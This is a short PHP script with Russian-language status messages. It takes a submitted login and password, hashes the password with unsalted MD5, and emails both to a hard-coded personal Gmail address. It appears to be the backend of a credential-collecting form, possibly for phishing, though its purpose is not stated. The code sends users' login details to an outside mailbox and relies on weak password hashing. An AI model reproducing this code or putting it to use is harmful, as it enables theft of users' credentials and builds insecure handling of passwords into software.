<?
$login = htmlspecialchars($_POST['login_1']);
$pass_md5 = md5($_POST['pass_1']);
if (mail("pavelsergmgtu@gmail.com", 'Данные пользователя', "login:$login password(md_5):$pass_md5")) {
    echo "Письмо успешно отправлено";
} else {
    echo "Возникли проблемы с отправкой письма";
}

?>